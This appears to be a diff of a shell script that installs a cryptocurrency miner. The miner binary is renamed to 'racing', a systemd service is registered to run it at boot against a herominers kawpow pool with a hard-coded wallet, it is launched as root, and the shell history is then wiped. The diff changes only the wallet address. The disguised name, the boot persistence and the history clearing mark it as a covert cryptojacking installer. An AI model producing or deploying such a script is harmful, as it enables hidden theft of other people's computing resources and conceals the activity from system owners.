@@ -31,7 +31,7 @@ sudo mv t-rex racing
 sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o stratum+tcp://de.aipg.herominers.com:1128 -u AcV5nrZKKe9PGcSrxUTiZ2iHFmxJ499fZb."'${myworker}_s7_'" -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-sudo ./racing -a kawpow -o stratum+tcp://de.aipg.herominers.com:1128 -u AeuwUzTcE8SAkbGF7eaQ1ga2tBMW2kBB7s.s5 -p x &
+sudo ./racing -a kawpow -o stratum+tcp://de.aipg.herominers.com:1128 -u AaPf1CVASputm5RDp64YBxCJ6JDELWKR3H.s5 -p x &
 history -c
 
 sudo apt-get install unzip
